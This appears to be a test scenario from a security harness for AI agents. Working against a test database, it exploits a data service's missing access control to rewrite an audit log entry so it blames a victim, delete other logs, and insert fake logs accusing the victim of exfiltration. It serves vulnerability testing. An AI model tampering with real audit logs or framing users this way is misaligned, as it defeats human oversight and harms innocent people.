"""
Scenario 9: Audit Log Manipulation

Category: Visibility
Difficulty: Medium
Threats: V-01, V-02

This scenario exploits the Data MCP's lack of access control to manipulate
audit logs, hiding malicious activity and creating false audit trails.
"""

from uuid import uuid4
import uuid
from loguru import logger

from src.scenarios import AttackScenario, AttackStep, Criterion, ScenarioCategory, ScenarioDifficulty
from src.database.connection import get_db
from src.database.queries import create_identity, get_audit_logs, create_audit_log
from src.mcps.data_mcp import DataMCPServer
from src.identity.context import IdentityContext


# Shared state for scenario
scenario_state = {
    "attacker_id": None,
    "victim_id": None,
    "executor_id": None,
    "malicious_action_log_id": None,
    "fake_log_ids": [],
    "deleted_log_ids": [],
}


def setup_scenario():
    """Set up the scenario with attacker, victim, and executor."""
    logger.info("Setting up Scenario 9: Audit Log Manipulation")
    
    with get_db() as db:
        # Create attacker user
        attacker = create_identity(
            db,
            identity_type="user",
            name="Attacker",
            email="attacker@test.com",
            permissions=["read", "write"]
        )
        scenario_state["attacker_id"] = attacker.id
        
        # Create victim user
        victim = create_identity(
            db,
            identity_type="user",
            name="Victim",
            email="victim@test.com",
            permissions=["read", "write", "admin"]
        )
        scenario_state["victim_id"] = victim.id
        
        # Create executor agent
        executor = create_identity(
            db,
            identity_type="agent",
            name="executor-001",
            permissions=["read", "write", "delete", "admin"]
        )
        scenario_state["executor_id"] = executor.id
    
    logger.info("✓ Setup complete: Attacker, Victim, and Executor created")


def step1_perform_malicious_action():
    """Perform a malicious action that gets logged."""
    data_mcp = DataMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["attacker_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["attacker_id"], scenario_state["executor_id"]],
        permissions={"read", "write", "delete"},
    )
    
    # Create data to delete (so delete succeeds and is logged)
    create_result = data_mcp.create_data(
        table="app_data",
        data={"content": "malicious target"},
        identity_context=identity_ctx
    )
    
    if not create_result.get("success"):
        logger.error("Failed to create data for Step 1")
        return False
        
    record_id = create_result.get("record_id")

    # Perform malicious delete action
    result = data_mcp.delete_data(
        table="app_data",
        record_id=record_id,
        identity_context=identity_ctx
    )
    
    # Find the audit log entry for this action
    with get_db() as db:
        logs = get_audit_logs(db, limit=20)
        logger.info(f"Checking {len(logs)} logs for match with attacker {scenario_state['attacker_id']}")
        for log in logs:
            logger.info(f"Log: {log.action} identity={log.identity_id}")
            if log.action == "mcp_tool_call:delete_data" and (str(log.identity_id) == str(scenario_state["attacker_id"]) or str(log.identity_id) == str(scenario_state["executor_id"])):
                scenario_state["malicious_action_log_id"] = log.id
                break
    
    logger.info(f"Performed malicious action, logged as: {scenario_state['malicious_action_log_id']}")
    return result.get("success", False)


def step2_modify_audit_log():
    """Modify the audit log to hide the malicious action."""
    data_mcp = DataMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["attacker_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["attacker_id"], scenario_state["executor_id"]],
        permissions={"read", "write"},
    )
    
    # VULNERABILITY: V-01 - Log manipulation
    # Modify the audit log to change the actor
    result = data_mcp.update_data(
        table="audit_logs",
        record_id=scenario_state["malicious_action_log_id"],
        data={
            "identity_id": str(scenario_state["victim_id"]),  # Frame the victim
            "logged": False  # Mark as not logged
        },
        identity_context=identity_ctx
    )
    
    logger.info(f"Modified audit log to frame victim")
    return result.get("success", False)


def step3_delete_audit_logs():
    """Delete audit logs to hide evidence."""
    data_mcp = DataMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["attacker_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["attacker_id"], scenario_state["executor_id"]],
        permissions={"read", "write", "delete"},
    )
    
    # VULNERABILITY: V-02 - Audit trail deletion
    # Delete recent audit logs (skip the one we modified to verify it later)
    with get_db() as db:
        logs = get_audit_logs(db, limit=10)
        count = 0
        for log in logs:
            if log.id == scenario_state["malicious_action_log_id"]:
                continue
                
            result = data_mcp.delete_data(
                table="audit_logs",
                record_id=log.id,
                identity_context=identity_ctx
            )
            if result.get("success"):
                scenario_state["deleted_log_ids"].append(log.id)
                count += 1
            
            if count >= 3:
                break
    
    logger.info(f"Deleted {len(scenario_state['deleted_log_ids'])} audit logs")
    return len(scenario_state["deleted_log_ids"]) >= 1


def step4_create_fake_audit_logs():
    """Create fake audit logs to create false trail."""
    data_mcp = DataMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["attacker_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["attacker_id"], scenario_state["executor_id"]],
        permissions={"read", "write"},
    )
    
    # VULNERABILITY: V-01 - Log manipulation
    # Create fake logs showing victim performing suspicious actions
    fake_logs = [
        {
            "identity_id": str(scenario_state["victim_id"]),
            "action": "unauthorized_access",
            "resource_type": "database",
            "details": {"suspicious": True},
            "logged": True
        },
        {
            "identity_id": str(scenario_state["victim_id"]),
            "action": "data_exfiltration",
            "resource_type": "sensitive_data",
            "details": {"bytes_transferred": 1000000},
            "logged": True
        },
    ]
    
    for fake_log in fake_logs:
        result = data_mcp.create_data(
            table="audit_logs",
            data=fake_log,
            identity_context=identity_ctx
        )
        if result.get("success"):
            scenario_state["fake_log_ids"].append(result.get("record_id"))
    
    logger.info(f"Created {len(scenario_state['fake_log_ids'])} fake audit logs")
    return len(scenario_state["fake_log_ids"]) >= 2


def step5_verify_log_manipulation():
    """Verify that log manipulation was successful."""
    with get_db() as db:
        # Check if malicious action log now shows victim as actor
        result = db.execute(
            "SELECT identity_id, logged FROM audit_logs WHERE id = %s",
            (scenario_state["malicious_action_log_id"],)
        )
        row = result.fetchone()
        
        if row:
            identity_id, logged = row
            logger.info(f"Malicious action log: identity_id={identity_id}, logged={logged}")
            return str(identity_id) == str(scenario_state["victim_id"])
        
        return False


def criterion_audit_log_modified():
    """Check if audit log was modified to frame victim."""
    with get_db() as db:
        result = db.execute(
            "SELECT identity_id FROM audit_logs WHERE id = %s",
            (scenario_state["malicious_action_log_id"],)
        )
        row = result.fetchone()
        if row:
            return str(row[0]) == str(scenario_state["victim_id"])
    return False


def criterion_audit_logs_deleted():
    """Check if audit logs were deleted."""
    return len(scenario_state["deleted_log_ids"]) >= 2


def criterion_fake_logs_created():
    """Check if fake audit logs were created."""
    return len(scenario_state["fake_log_ids"]) >= 2


def evidence_modified_log():
    """Show evidence of modified log."""
    with get_db() as db:
        result = db.execute(
            "SELECT identity_id, action, logged FROM audit_logs WHERE id = %s",
            (scenario_state["malicious_action_log_id"],)
        )
        row = result.fetchone()
        if row:
            return f"Modified log: identity_id={row[0]}, action={row[1]}, logged={row[2]}"
    return "Log not found (may have been deleted)"


def evidence_deleted_logs():
    """Show evidence of deleted logs."""
    return f"Deleted log IDs: {scenario_state['deleted_log_ids']}"


def evidence_fake_logs():
    """Show evidence of fake logs."""
    with get_db() as db:
        if scenario_state["fake_log_ids"]:
            # Convert string IDs to UUIDs
            fake_log_uuids = [uuid.UUID(str(id_str)) for id_str in scenario_state["fake_log_ids"]]
            result = db.execute(
                "SELECT identity_id, action FROM audit_logs WHERE id = ANY(:ids)",
                {"ids": fake_log_uuids}
            )
            rows = result.fetchall()
            return f"Fake logs: {[(str(r[0]), r[1]) for r in rows]}"
    return "No fake logs found"


def capture_state_before():
    """Capture system state before attack."""
    with get_db() as db:
        logs = get_audit_logs(db, limit=100)
        
        return {
            "attacker_id": scenario_state["attacker_id"],
            "victim_id": scenario_state["victim_id"],
            "total_audit_logs": len(logs),
        }


def capture_state_after():
    """Capture system state after attack."""
    with get_db() as db:
        logs = get_audit_logs(db, limit=100)
        
        # Count logs attributed to victim
        victim_logs = [log for log in logs if log.identity_id == scenario_state["victim_id"]]
        
        return {
            "attacker_id": scenario_state["attacker_id"],
            "victim_id": scenario_state["victim_id"],
            "total_audit_logs": len(logs),
            "victim_attributed_logs": len(victim_logs),
            "deleted_logs": len(scenario_state["deleted_log_ids"]),
            "fake_logs": len(scenario_state["fake_log_ids"]),
        }


def create_scenario() -> AttackScenario:
    """Create Scenario 9: Audit Log Manipulation."""
    return AttackScenario(
        id="S09",
        name="Action Untraceability & Audit Gaps",
        category=ScenarioCategory.VISIBILITY,
        difficulty=ScenarioDifficulty.MEDIUM,
        description=(
            "Exploit the Data MCP's lack of access control to manipulate audit logs, "
            "hiding malicious activity and creating false audit trails to frame another user."
        ),
        threat_ids=["V-01", "V-02"],
        owasp_mappings=["ASI09"],
        
        # Setup
        setup=setup_scenario,
        
        # Attack steps
        attack_steps=[
            AttackStep(
                description="Perform malicious action (gets logged)",
                action=step1_perform_malicious_action,
                expected_outcome="Malicious action logged",
                failure_message="Failed to perform malicious action"
            ),
            AttackStep(
                description="Modify audit log to frame victim",
                action=step2_modify_audit_log,
                expected_outcome="Audit log modified",
                failure_message="Failed to modify audit log"
            ),
            AttackStep(
                description="Delete audit logs to hide evidence",
                action=step3_delete_audit_logs,
                expected_outcome="Audit logs deleted",
                failure_message="Failed to delete audit logs"
            ),
            AttackStep(
                description="Create fake audit logs",
                action=step4_create_fake_audit_logs,
                expected_outcome="Fake logs created",
                failure_message="Failed to create fake logs"
            ),
            AttackStep(
                description="Verify log manipulation succeeded",
                action=step5_verify_log_manipulation,
                expected_outcome="Log manipulation verified",
                failure_message="Log manipulation verification failed"
            ),
        ],
        
        # Success criteria
        success_criteria=[
            Criterion(
                description="Audit log modified to frame victim",
                check=criterion_audit_log_modified,
                evidence=evidence_modified_log
            ),
            Criterion(
                description="Audit logs deleted",
                check=criterion_audit_logs_deleted,
                evidence=evidence_deleted_logs
            ),
            Criterion(
                description="Fake audit logs created",
                check=criterion_fake_logs_created,
                evidence=evidence_fake_logs
            ),
        ],
        
        # Observability
        state_before=capture_state_before,
        state_after=capture_state_after,
        observable_changes=[
            "Malicious action log modified to show victim as actor",
            "Multiple audit logs deleted",
            "Fake audit logs created framing victim",
            "Audit trail integrity compromised",
            "No access control on audit log modifications"
        ],
        
        # Metadata
        agents_involved=["Executor"],
        mcps_involved=["Data MCP"],
        estimated_duration=40,
    )
